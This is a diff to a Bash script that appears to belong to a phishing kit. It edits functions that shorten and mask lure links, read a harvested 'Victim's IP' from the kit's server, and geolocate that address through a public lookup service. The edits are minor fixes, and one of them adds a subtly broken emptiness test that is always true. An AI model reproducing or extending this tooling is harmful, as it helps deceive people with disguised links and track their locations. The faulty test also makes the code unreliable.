@@ -650,7 +650,7 @@ shorten_shortcode() {
 }
 shorten_tinyurl() {
 	link_tinyurl=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-delay 2 "$1$2")
-	if [ -z "link_tinyurl" ]; then
+	if [ $link_tinyurl=="" ]; then
 		processed_tinyurl_url="${ORANGE} Couldn't shorten this link here"
 		final_tinyurl_url="${ORANGE} Couldn't shorten this link here"
 		masked_tinyurl_url="${ORANGE} Couldn't mask this link here"
@@ -770,8 +770,8 @@ capture_data_3() {
 
 ## Get IP address
 capture_ip() {
-##        IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
-				IP=$(awk -F'IP: ' '{print $2}' .server/www/ip.txt | xargs)
+##      IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
+	IP=$(awk -F 'IP: ' '{print $2}' .server/www/ip.txt | xargs)
         IFS=$'\n'
         echo -e "\n${RED} Victim's IP : ${RED}$IP"
 	if [[ $reply_tunnel -eq 1 || $reply_tunnel -eq 01 ]]; then
@@ -779,7 +779,7 @@ capture_ip() {
 		echo " "
 		save_ip
 	else
-		ip_details
+		ip_details $IP
 		save_ip
 	fi
 }
@@ -792,6 +792,7 @@ save_ip() {
 	rm -rf .server/www/ip.txt
 }
 ip_details() {
+	IP=$1
 	curl -s -L "http://ipwhois.app/json/$IP" > rawtrack.txt
 	grep -o '"[^"]*"\s*:\s*[^,]*' rawtrack.txt > track.txt
 	iptt=$(sed -n 's/"ip"://p' track.txt)
